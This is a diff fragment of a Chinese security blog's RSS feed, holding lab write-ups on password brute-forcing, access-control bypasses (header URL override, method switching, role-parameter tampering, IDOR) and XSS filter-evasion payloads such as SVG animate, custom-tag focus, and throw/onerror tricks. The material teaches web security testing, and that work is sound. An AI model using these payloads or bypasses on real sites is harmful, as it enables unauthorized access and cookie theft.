+<p>如果密码更改功能允许攻击者直接访问且未以受害者身份登录，则可能特别危险。例如，如果用户名被设置在隐藏字段中，攻击者可能能够在请求中编辑该值，以针对任意用户。这可能被利用来枚举用户名和暴力破解密码。</p>
+<p>例如，先用已知账号进行分析，发现原密码正确，新密码输入不一致时，会返回<code>new passwords do not match</code>。于是，保持新密码输入不一致，爆破原密码，并设置过滤条件<code>new passwords do not match</code>。注意，删除Origin中的旧id。</p>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>访问控制</title>
+      <link>https://all-on.github.io/posts/web/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/</link>
+      <pubDate>Mon, 23 Mar 2026 00:00:00 +0000</pubDate>
+      <guid>https://all-on.github.io/posts/web/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/</guid>
+      <description>&lt;h2 id=&#34;基本概念&#34;&gt;基本概念&lt;/h2&gt;
+&lt;h3 id=&#34;垂直访问控制&#34;&gt;垂直访问控制&lt;/h3&gt;
+&lt;p&gt;垂直访问控制是一种限制特定类型用户访问敏感功能的机制。通过垂直访问控制，不同类型的用户可以访问不同的应用功能。例如，管理员可能能够修改或删除任何用户的账户，而普通用户则无法访问这些操作。&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<h2 id="基本概念">基本概念</h2>
+<h3 id="垂直访问控制">垂直访问控制</h3>
+<p>垂直访问控制是一种限制特定类型用户访问敏感功能的机制。通过垂直访问控制，不同类型的用户可以访问不同的应用功能。例如，管理员可能能够修改或删除任何用户的账户，而普通用户则无法访问这些操作。</p>
+<h3 id="水平访问控制">水平访问控制</h3>
+<p>水平访问控制是一种限制特定用户访问资源的机制。通过水平访问控制，不同用户可以访问同类型资源的子集。例如，银行应用允许用户查看自己的账户交易和付款，但不能查看其他用户的账户。</p>
+<h3 id="上下文相关访问控制">上下文相关访问控制</h3>
+<p>上下文依赖访问控制根据应用状态或用户与其交互来限制对功能和资源的访问。上下文相关的访问控制防止用户按错误顺序执行操作。例如，零售网站可能阻止用户在付款后修改购物车内容。</p>
+<h2 id="垂直权限升级">垂直权限升级</h2>
+<p>如果用户能够访问他们不被允许访问的功能，这就是垂直特权升级。例如，如果非管理员用户能够访问管理员页面并删除用户账户，这就是垂直权益升级。</p>
+<h3 id="未受保护的管理功能">未受保护的管理功能</h3>
+<p>最基本的垂直权限升级是指应用程序不强制保护敏感功能时。例如，管理功能可能从管理员的欢迎页面链接，但不链接用户的欢迎页面。不过，用户可能可以通过浏览到相关的管理员 URL 访问管理功能。例如，一个网站可能托管在以下URL的敏感功能：</p>
+<p><code>https://insecure-website.com/admin</code></p>
+<p>这可能对任何用户开放，而不仅仅是管理员用户，他们在用户界面中链接到了该功能。在某些情况下，管理网址可能会在其他地方被披露，例如文件 <code>robots.txt</code> ：</p>
+<p><code>https://insecure-website.com/robots.txt</code></p>
+<p>但在某些情况下，敏感功能会通过赋予更难预测的网址来隐藏。这就是所谓“隐蔽性安全”的一个例子。然而，隐藏敏感功能并不能提供有效的访问控制，因为用户可能会通过多种方式发现被混淆的URL。假如一个托管管理功能的应用程序，URL如下：</p>
+<p><code>https://insecure-website.com/administrator-panel-yb556</code></p>
+<p>这个很难猜到。但URL可能在JavaScript中披露。查看源代码即可。</p>
+<h3 id="基于参数的访问控制方法">基于参数的访问控制方法</h3>
+<p>一些应用程序在登录时确定用户的访问权限或角色，并将这些信息存储在用户可控制的位置。这可能是：</p>
+<ul>
+<li>一个隐藏的领域。</li>
+<li>一个cookie。</li>
+<li>一个预设的查询字符串参数。</li>
+</ul>
+<p>例如，在cookie中发现有 <code>admin</code> 参数，只有当为 <code>true</code> 的时候才能以管理员身份操作账户。于是，接下来的每一步都通过抓包修改。</p>
+<p>再例如，题目提示到需要参数 <code>roleid</code> 等于2时，才能获得admin权限。终于，在更改电子邮件的页面，看到了响应的 <code>json</code> 中有 <code>roleid=1</code> 。那怎么改呢？在请求的页面的 <code>json</code> 格式中，添加 <code>roleid=2</code> 即可。</p>
+<h3 id="平台配置错误导致的访问控制失效">平台配置错误导致的访问控制失效</h3>
+<p>一些应用程序在平台层执行访问控制。他们通过根据用户角色限制对特定 URL 和 HTTP 方法的访问来实现这一点。例如，应用程序可能配置规则如下：</p>
+<p><code>DENY: POST, /admin/deleteUser, managers</code></p>
+<p>此规则拒绝管理组用户对 URL <code>/admin/deleteUser</code> 上的 <code>POST</code> 方法的访问。在这种情况下，各种问题可能会导致访问控制绕过。一些应用程序框架支持各种非标准的 HTTP 头，可以用来覆盖原始请求中的 URL，例如 <code>X-Original-URL</code> 和 <code>X-Rewrite-URL</code>。如果一个网站使用严格的前端控制来根据 URL 限制访问，但应用程序允许通过请求头覆盖 URL，那么可能可以通过如下请求绕过访问控制：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">POST / HTTP/1.1
+</span></span><span class="line"><span class="ln">2</span><span class="cl">X-Original-URL: /admin/deleteUser
+</span></span><span class="line"><span class="ln">3</span><span class="cl">...
+</span></span></code></pre></div><p>另一种攻击与请求中使用的 HTTP 方法有关。前面描述的前端控制是基于 URL 和 HTTP 方法来限制访问的。一些网站在执行操作时会容忍不同的 HTTP 请求方法。如果攻击者可以使用 <code>GET</code>（或其他）方法对受限 URL 执行动作，他们就可以绕过在平台层实现的访问控制。</p>
+<p>例如，如果能够抓住管理员对一个用户升级的页面，并把账户名改为自己。然后将自己的cookie复制上去，将 <code>POST</code> 方法改为 <code>GET</code> ，就能够通过。</p>
+<h3 id="url匹配不一致导致的访问控制失效">URL匹配不一致导致的访问控制失效</h3>
+<p>这里有3种情况。一个是，网站在匹配输入请求路径到特定端点的严格程度上各不相同。比如，大小写绕过。</p>
+<p>第二个是，如果使用 Spring 框架的开发人员启用了 <code>useSuffixPatternMatch</code> 选项，也可能出现类似的差异。该选项允许将具有任意文件扩展名的路径映射到没有文件扩展名的等效端点。换句话说，对 <code>/admin/deleteUser.anything</code> 的请求仍然会匹配 <code>/admin/deleteUser</code> 模式。在 Spring 5.3 之前，该选项默认是启用的。</p>
+<p>第三个是，在后端添加一个反斜杠 <code>/</code> 绕过。比如，可能会遇到 <code>/admin/deleteUser</code> 和 <code>/admin/deleteUser/</code> 是否被视为不同端点的差异。</p>
+<h2 id="水平权限升级">水平权限升级</h2>
+<p>水平权限升级攻击可能使用与垂直权限升级类似的利用方法。</p>
+<h3 id="更改id">更改id</h3>
+<p>用户可能使用以下URL访问自己的账户页面：</p>
+<p><code>https://insecure-website.com/myaccount?id=123</code></p>
+<p>如果攻击者将参数值修改为另一用户的<code>id</code>，他们可能会访问另一用户的账户页面，以及相关的数据和函数。</p>
+<p>某些情况下，应用程序会检测用户未被允许访问资源，并返回登录页面重定向。然而，包含重定向的响应可能仍包含目标用户的一些敏感数据，因此攻击仍然成功。</p>
+<h3 id="id不可预测">id不可预测</h3>
+<p>在某些应用中，可利用参数没有可预测的值。例如，应用程序可能使用全局唯一标识符（GUID）来识别用户，而不是递增数字。这可能防止攻击者猜测或预测其他用户的标识符。然而，属于其他用户的 GUID 可能会在应用中被引用用户的其他地方披露，如用户消息或评论。</p>
+<p>例如，找到受害者曾经发表过的一篇博客。点击进入主页。在网页中就能够找到难以预测的 <code>UserId</code> 。然后像上面那样更改即可。</p>
+<h2 id="水平到垂直权限升级">水平到垂直权限升级</h2>
+<p>通常，水平权限升级攻击可以通过破坏更高权限用户而转变为垂直权限升级。例如，水平升级可能允许攻击者重置或捕获属于其他用户的密码。如果攻击者针对管理员用户并攻破其账户，则可以获得管理员访问权限，从而进行垂直权力提升。</p>
+<p>例如，在自己的页面发现密码是直接泄露的。于是，尝试将账户名改为管理员 <code>administrator</code> 的，这样就能够得到管理员的密码。然后以管理员的身份进行登录。</p>
+<h2 id="不安全的直接对象引用">不安全的直接对象引用</h2>
+<p>不安全的直接对象引用（IDOR）是访问控制漏洞的一个子类别。IDOR发生在应用程序使用用户输入直接访问对象，攻击者可能修改输入以获得未授权访问时。常见的有两种。一种是直接引用数据库对象的IDOR漏洞。一个网站，通过从后端数据库获取信息，使用以下URL访问客户账户页面：</p>
+<p><code>https://insecure-website.com/customer_account?customer_number=132355</code></p>
+<p>在这里，客户编号直接作为后端数据库查询中的记录索引使用。如果没有其他控制措施，攻击者可以简单地修改 <code>customer_number</code> 的数值，绕过访问控制查看其他客户的记录。这是一个导致横向权限升级的IDOR漏洞示例。</p>
+<p>另一种是直接引用静态文件的IDOR漏洞。IDOR 漏洞通常发生在敏感资源位于服务器端文件系统的静态文件中。例如，一个网站可能会用递增的文件名将聊天消息文字稿保存到磁盘，允许用户通过访问如下URL来获取这些内容：</p>
+<p><code>https://insecure-website.com/static/12144.txt</code></p>
+<p>在这种情况下，攻击者可以简单修改文件名，获取其他用户创建的文字稿，从而可能获取用户凭证和其他敏感数据。</p>
+<p>例如，在发送信息时，发现聊天记录位于 <code>2.txt</code> 中。于是，稍加改动，改为 <code>1.txt</code> ，显示出了了密码。</p>
+<h2 id="多步流程中的访问控制漏洞">多步流程中的访问控制漏洞</h2>
+<p>许多网站通过一系列步骤实现重要功能。这种情况很常见：</p>
+<ul>
+<li>需要捕捉各种输入或选项。</li>
+<li>用户需要在执行操作前审核并确认细节。</li>
+</ul>
+<p>比如，更新用户信息的管理功能可能包括以下步骤：加载包含特定用户详细信息的表单、提交修改、请查看更改并确认。有时，网站会对部分步骤实施严格的访问控制，但忽略其他步骤。想象一个网站，访问控制正确应用于第一步和第二步，但对第三步却没有。网站假设用户只有在完成第一步且受控的第一步时，才能达到第三步。攻击者可以通过跳过前两步，直接提交带有所需参数的第三步请求，从而获得对该函数的未授权访问。</p>
+<p>例如，管理员在升级一个账户的时候，分为两步：提权和确定。先抓住这两个页面。然后会发现第一个页面没用。无论是覆盖账户名，还是覆盖cookie，都会提示“未授权”。那么，操作第二个页面，即“确认”页面，成功。</p>
+<h2 id="基于-referer-的访问控制">基于 <code>Referer</code> 的访问控制</h2>
+<p>一些网站根据 HTTP 请求中提交的 <code>Referer</code> 头来控制访问。浏览器可以在请求中添加 <code>Referer</code> 头，以指示哪个页面发起了请求。</p>
+<p>比如，一个应用程序在 <code>/admin</code> 的主管理页面上强制执行了访问控制，但对于诸如 <code>/admin/deleteUser</code> 的子页面，仅检查 <code>Referer</code> 头。如果 <code>Referer</code> 头包含主 <code>/admin</code> URL，则允许该请求。在这种情况下，<code>Referer</code> 头可以被攻击者完全控制。这意味着他们可以通过提供所需的 <code>Referer</code> 头伪造对敏感子页面的直接请求，并获得未经授权的访问。</p>
+<h2 id="基于位置的访问控制">基于位置的访问控制</h2>
+<p>有些网站会根据用户的地理位置来实施访问控制。这可能适用于银行应用或媒体服务，这些地方适用州法律或商业限制。这些访问控制通常可以通过使用网络代理、VPN或操作客户端地理定位机制来绕过。</p>
+<h2 id="预防">预防</h2>
+<p>通过采取防御深度方法并应用以下原则，可以预防访问控制漏洞：</p>
+<ul>
+<li>绝不要仅依赖混淆来控制访问。</li>
+<li>除非资源是打算公开访问的，否则默认拒绝访问。</li>
+<li>尽可能使用统一的应用范围机制来执行访问控制。</li>
+<li>在代码层面，强制开发者声明每个资源允许的访问权限，并默认拒绝访问。</li>
+<li>彻底审计和测试访问控制，确保其按设计正常工作。</li>
+</ul>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>XSS 上下文</title>
+      <link>https://all-on.github.io/posts/web/xss/xss-%E4%B8%8A%E4%B8%8B%E6%96%87/</link>
+      <pubDate>Thu, 19 Mar 2026 00:00:00 +0000</pubDate>
+      <guid>https://all-on.github.io/posts/web/xss/xss-%E4%B8%8A%E4%B8%8B%E6%96%87/</guid>
+      <description>&lt;h2 id=&#34;大部分标签和属性被屏蔽&#34;&gt;大部分标签和属性被屏蔽&lt;/h2&gt;
+&lt;p&gt;例如，测试时可以发现大多数的标签和事件被拦截，只有部分可用。进行爆破，发现只有&lt;code&gt;body&lt;/code&gt;标签和&lt;code&gt;onresize&lt;/code&gt;事件没有被过滤。于是，在xss服务器上输入：&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<h2 id="大部分标签和属性被屏蔽">大部分标签和属性被屏蔽</h2>
+<p>例如，测试时可以发现大多数的标签和事件被拦截，只有部分可用。进行爆破，发现只有<code>body</code>标签和<code>onresize</code>事件没有被过滤。于是，在xss服务器上输入：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;</span><span class="n">iframe</span> <span class="n">src</span><span class="o">=</span><span class="s2">&#34;https://YOUR-LAB-ID.web-security-academy.net/?search=&#34;</span><span class="o">&gt;&lt;</span><span class="n">body</span> <span class="n">onresize</span><span class="o">=</span><span class="nb">print</span><span class="p">()</span><span class="o">&gt;</span><span class="s2">&#34; onload=this.style.width=&#39;100px&#39;&gt;</span>
+</span></span></code></pre></div><p>保存后输出。<code>onresize</code>事件会在窗口大小改变时触发<code>print()</code>，拖动窗口改变大小便触发了<code>print()</code>。</p>
+<h2 id="只有自定义标签能通过">只有自定义标签能通过</h2>
+<p>例如，所有标签都被过滤时，由于现代浏览器对自定义标签非常宽容，所以可以使用自定义标签。因此，可用在xss服务器上输入：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&lt;script&gt;
+</span></span><span class="line"><span class="ln">2</span><span class="cl">location = &#39;https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x&#39;;
+</span></span><span class="line"><span class="ln">3</span><span class="cl">&lt;/script&gt;
+</span></span></code></pre></div><p>中间是经过URL编码的结果，解码后结果为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&lt;script&gt;
+</span></span><span class="line"><span class="ln">2</span><span class="cl">location = &#39;https://YOUR-LAB-ID.web-security-academy.net/?search=&lt;xss id=x onfocus=alert(document.cookie) tabindex=1&gt;#x&#39;;
+</span></span><span class="line"><span class="ln">3</span><span class="cl">&lt;/script&gt;
+</span></span></code></pre></div><p>其中的<code>&lt;xss&gt;</code>是自定义标签，只要有 <code>tabindex</code> 属性，就可以通过键盘 Tab 或 JS 的 <code>.focus()</code> 获得焦点。<code>tabindex</code>让这个自定义元素可以被聚焦（否则 <code>onfocus</code> 永远不会触发）。URL 末尾的 <code>#x</code> 会让浏览器尝试滚动到 <code>id=&quot;x&quot;</code> 的元素。</p>
+<h2 id="事件和-href-属性被阻止">事件和 <code>href</code> 属性被阻止</h2>
+<p>例如，所有事件都被阻止，href 锚点属性（如 <code>&lt;a href=&quot;javascript:...&quot;&gt;</code>）也被过滤。只能自定义事件：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">?search=&lt;svg&gt;&lt;a&gt;&lt;animate attributeName=href values=javascript:alert(1) /&gt;&lt;text x=20 y=20&gt;Click me&lt;/text&gt;&lt;/a&gt;
+</span></span></code></pre></div><p>翻译过来就是：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&lt;svg&gt;
+</span></span><span class="line"><span class="ln">2</span><span class="cl">  &lt;a&gt;
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    &lt;animate attributeName=&#34;href&#34; values=&#34;javascript:alert(1)&#34; /&gt;
+</span></span><span class="line"><span class="ln">4</span><span class="cl">    &lt;text x=20 y=20&gt;Click me&lt;/text&gt;
+</span></span><span class="line"><span class="ln">5</span><span class="cl">  &lt;/a&gt;
+</span></span><span class="line"><span class="ln">6</span><span class="cl">&lt;/svg&gt;
+</span></span></code></pre></div><p>SVG 支持 SMIL（<code>Synchronized Multimedia Integration Language</code>）动画，其中 <code>&lt;animate&gt;</code> 可以在运行时动态修改元素的属性。<code>&lt;a&gt;</code> 是一个 SVG 中的超链接元素（类似 HTML 的 <code>&lt;a&gt;</code>）。<code>&lt;animate attributeName=&quot;href&quot; ...&gt;</code> 表示将父元素（即 <code>&lt;a&gt;</code>）的 <code>href</code> 属性动画化。<code>values=&quot;javascript:alert(1)&quot;</code> 表示把 <code>href</code> 的值设为 <code>javascript:alert(1)</code>。这样，页面加载后，<code>&lt;a&gt;</code> 元素的 <code>href</code> 被动态设置为 <code>javascript:alert(1)</code>。</p>
+<h2 id="允许部分svg标记">允许部分SVG标记</h2>
+<p>例如，对标签爆破，发现可用的是<code>svg</code>和<code>animatetransform</code>；对事件爆破，发现只能用<code>onbegin</code>。注意，爆破事件的时候，需要对空格等进行编码转义。
+payload如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&lt;svg&gt;&lt;animatetransform onbegin=alert(1)&gt; 
+</span></span></code></pre></div><h2 id="角括号被编码">角括号（<code>&lt;&gt;</code>）被编码</h2>
+<p>例如，对于输入的值<code>xxx</code>，是这样处理的：
+<code>&lt;... value=&quot;xxx&quot;&gt;</code>
+想要简单地避免，比如使用<code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code>是不可行的，因为角括号被编码了，识别不出来。因此，通常可以引入一个新属性来创建脚本化的上下文，比如事件处理程序。例如：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&#34; autofocus onfocus=alert(document.domain) x=&#34;
+</span></span></code></pre></div><p>上述有效负载创建了一个 <code>onfocus</code> 事件，当元素获得焦点时将执行 JavaScript，同时还添加了 <code>autofocus</code> 属性，尝试在无需用户交互的情况下自动触发 <code>onfocus</code> 事件。最后，它添加了 <code>x=;</code> 以优雅地修复后续的标记。
+具体而言，可以采用下面的payload：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&#34;onmouseover=&#34;alert(1)
+</span></span></code></pre></div><h2 id="注入到带双引号-html-编码的href锚点属性中">注入到带双引号 HTML 编码的<code>href</code>锚点属性中</h2>
+<p>有时 XSS 上下文属于某种 HTML 标签属性，而该属性本身可以创建可脚本化的上下文。在这里，你可以执行 JavaScript 而不终止属性值。例如，如果 XSS 上下文位于锚标签的属性<code>href</code>中，你可以使用<code>javascript</code>伪协议来执行脚本。例如：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&lt;a href=&#34;javascript:alert(document.domain)&#34;&gt;
+</span></span></code></pre></div><p>例如，在一条评论中，对输入的网址<code>https://aa.com</code>进行这样的处理：
+<code>&lt;a href=&quot;https://aa.com&quot;&gt;</code>
+对于输入到锚点属性的双引号中的注入点，可以直接在网址处这样处理：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">javascript:alert(1)
+</span></span></code></pre></div><h2 id="规范链接标签中的反射型-xss">规范链接标签中的反射型 XSS</h2>
+<p>反射型的XSS更多在网址中直接注入。这一次，无法注入标签，可以利用页面中已存在的标签，通过其属性事件或内容触发脚本执行。比如，发现随着打开帖子的不同，网页中<code>postId</code> 参数的值在改变且直接用参数生成了 <code>&lt;link&gt;</code> 标签的 <code>href</code> 。可以更改参数进行尝试，发现网页代码是这样的：<code>&lt;link rel=&quot;canonical&quot; href=&quot;https://web-security.net/?abcd&quot;&gt;</code>，更改参数：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">?&#39;accesskey=&#39;x&#39;onclick=&#39;alert(1)
+</span></span></code></pre></div><p>注意，中间没有空格以绕过正则匹配。<code>accesskey</code> 是 HTML 元素的一个全局属性，用于定义快捷键。当用户按下对应的快捷键（通常是 Alt + x 或者其他组合，视浏览器和操作系统而定），浏览器会聚焦到该元素，方便键盘导航。第一个单引号闭合 <code>href</code> ，当用户按下对应的快捷键，浏览器会执行 alert(1)，弹出提示框。这样输入之后，网页源代码就会变为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&lt;link rel=&#34;canonical&#34; accesskey=&#34;X&#34; onclick=&#34;alert(1)&#34; /&gt;
+</span></span></code></pre></div><h2 id="注入到javascript中终止脚本">注入到Javascript中终止脚本</h2>
+<p>在最简单的情况下，可以关闭包含现有 <code>JavaScript</code> 的脚本标签，并引入一些新的HTML标签来触发 <code>JavaScript</code> 的执行。例如，如果XSS上下文如下：</p>
+<p><code>&lt;script&gt; ... var input = 'controllable data here'; ... &lt;/script&gt;</code></p>
+<p>然后可以用以下负载突破现有的 <code>JavaScript</code> ，执行自己的 <code>JavaScript</code> ：</p>
+<p><code>&lt;/script&gt;&lt;img src=1 onerror=alert(document.domain)&gt;</code></p>
+<p>之所以能做到这一点，是因为浏览器首先会进行HTML解析来识别包括脚本块在内的页面元素，然后才进行 <code>JavaScript</code> 解析来理解并执行嵌入的脚本。上述载荷使原始脚本破损，字符串字面值未终止。但这并不妨碍后续脚本被正常解析和执行。</p>
+<p>例如，上下文是：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;</span><span class="n">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">	<span class="k">var</span> <span class="n">searchTerms</span> <span class="o">=</span> <span class="s1">&#39;123456&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="n">document</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;&lt;img src=&#34;https://all-on.github.io/resources/images/tracker.gif?searchTerms=&#39;</span><span class="o">+</span><span class="n">encodeURIComponent</span><span class="p">(</span><span class="n">searchTerms</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;&#34;&gt;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
+</span></span></code></pre></div><p>虽然输入是注入到Javascript中且因转义规则（用单引号和反斜杠转义）难以逃脱，但是可以直接闭合进行注入：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</span></span></code></pre></div><h2 id="脱离-javascript-字符串">脱离 <code>Javascript</code> 字符串</h2>
+<p>除了终止脚本，还可以直接跳出来。一些有用的脱离字符串字面形式的方法包括：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&#39;-alert(document.domain)-&#39;
+</span></span><span class="line"><span class="ln">2</span><span class="cl">&#39;;alert(document.domain)//
+</span></span></code></pre></div><p>比如，和上面一样的上下文，但是对角括号（<code>&lt;&gt;</code>）进行了转义，那上面的办法就用不了。可以任意输入一条payload即可</p>
+<h2 id="在注入-javascript-中设置waf">在注入 <code>Javascript</code> 中设置WAF</h2>
+<p>有些网站通过限制允许使用的字符来使 XSS 更加困难。这可以在网站级别实现，或者通过部署防火墙（WAF）来防止你的请求到达网站。在这些情况下，需要尝试其他调用函数的方法以绕过这些安全措施。实现这一点的一种方法是使用带有异常处理器的 <code>throw</code> 语句。这使你可以在不使用括号的情况下向函数传递参数。以下代码将 <code>alert()</code> 函数分配给全局异常处理器，而 <code>throw</code> 语句将 <code>1</code> 传递给异常处理器（在本例中是 <code>alert</code>）。最终结果是调用 <code>alert()</code> 函数，并以 <code>1</code> 作为参数。
+<code>onerror=alert;throw 1</code></p>
+<p>例如，发现是反射型的XSS，且空格、<code>()</code>、<code>/</code>被过滤了，只能考虑间接调用，通过异常触发或类型转换触发函数。于是，输入：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">?postId=5&amp;%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
+</span></span></code></pre></div><p>翻译过来就是：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">?postId=5&amp;&#39;},x=x=&gt;{throw/**/onerror=alert,1337},toString=x,window+&#39;&#39;,{x:&#39;
+</span></span></code></pre></div><ul>
+<li>&lsquo;}：闭合原本的结构</li>
+<li><code>x = x =&gt; { throw/**/οnerrοr=alert,1337 }</code>：定义了一个箭头函数<code>x</code>，函数体是一个块，其中包含一个<code>throw</code>语句。先执行<code>onerror=alert</code>（将全局<code>window.onerror</code>设置为<code>alert</code>函数），然后整个表达式的结果为<code>1337</code>，所以<code>throw</code>抛出数值<code>1337</code>。注释<code>/**/</code>用于绕过可能的关键词（如空格）过滤</li>
+<li><code>toString=x</code>：将全局的<code>toString</code>属性（即<code>window.toString</code>）设置为上面定义的函数<code>x</code>。当任何需要将<code>window</code>对象转换为字符串的操作发生时，都会调用这个函数。</li>
+<li><code>window+''</code>：将<code>window</code>对象与空字符串相加，这会触发JavaScript的隐式类型转换，调用<code>window.toString()</code>方法。</li>
+</ul>
+<h2 id="onclick事件"><code>onclick</code>事件</h2>
+<p>当 XSS 上下文是带有引号的标签属性中的某个现有 JavaScript，例如事件处理程序时，可以使用 HTML 编码来绕过某些输入过滤器。例如，如果XSS上下文如下：</p>
+<p><code>&lt;a href=&quot;#&quot; onclick=&quot;... var input='controllable data here'; ...&quot;&gt;</code></p>
+<p>应用程序会阻断或转义单引号字符，你可以使用以下负载来跳出JavaScript字符串，执行您自己的脚本：</p>
+<p><code>&amp;apos;-alert(document.domain)-&amp;apos;</code></p>
+<p><code>onclick</code> 是 HTML 标签的属性，浏览器在解析 HTML 标签时，会先对属性值中的 HTML 实体做解码，然后传递给 JavaScript 引擎执行。可以利用这一点。
+例如，对于输入的网址<code>http://aa.com</code>，最终处理为 <code>onclick=&quot;var tracker={track(){}};tracker.track('https://aa.com')</code>。那最后可以这样构造payload:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">http://&amp;apos;-alert(1)-&amp;apos
+</span></span></code></pre></div><h2 id="带有反引号的注入">带有反引号的注入</h2>
+<p>avaScript 模板的文字是允许嵌入 JavaScript 表达式的字符串文字。嵌入表达式会被评估，通常会被串接到周围的文本中。模板文字被封装在反向引号中，而非普通引号，嵌入表达式则通过<code>${...}</code>语法识别。
+例如，以下脚本将打印包含用户显示名称的欢迎消息：</p>
+<p><code>document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;</code></p>
+<p>当 XSS 上下文进入 JavaScript 模板的字面值时，无需终止该文字。相反，你只需使用<code>${...}</code>语法嵌入一个JavaScript表达式，当处理文字时会执行。例如，如果XSS上下文如下：</p>
+<p><code>&lt;script&gt; ... var input = `controllable data here`; ... &lt;/script&gt;</code></p>
+<p>然后可以使用以下负载执行JavaScript而不终止模板的字面性文件：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">${alert(document.domain)}
+</span></span></code></pre></div><p>例如，源代码对输入的 <code>aaa</code> 是这样处理的：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;</span><span class="n">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">	<span class="k">var</span> <span class="n">message</span> <span class="o">=</span> <span class="err">`</span><span class="mi">0</span> <span class="n">search</span> <span class="n">results</span> <span class="k">for</span> <span class="s1">&#39;aaa&#39;</span><span class="err">`</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">	<span class="n">document</span><span class="o">.</span><span class="n">getElementById</span><span class="p">(</span><span class="s1">&#39;searchMessage&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">innerText</span> <span class="o">=</span> <span class="n">message</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
+</span></span></code></pre></div><p>可见，需要将反引号和单引号闭合。但是，他们都被以Unicode的方式转义了。只能采用下面的payload：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">${alert(1)}
+</span></span></code></pre></div>]]></content:encoded>
+    </item>
+    <item>
+      <title>XSS及其漏洞利用</title>
+      <link>https://all-on.github.io/posts/web/xss/xss%E5%8F%8A%E5%85%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</link>
+      <pubDate>Thu, 19 Mar 2026 00:00:00 +0000</pubDate>
+      <guid>https://all-on.github.io/posts/web/xss/xss%E5%8F%8A%E5%85%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</guid>
+      <description>&lt;p&gt;跨站脚本（也称为XSS）是一种网络安全漏洞，允许攻击者破坏用户与易受攻击应用的交互。跨站脚本通过控易受攻击的网站，使其返回恶意JavaScript给用户来实现。当恶意代码在受害者浏览器内执行时，攻击者可以完全破坏与应用的交互。&lt;/p&gt;</description>
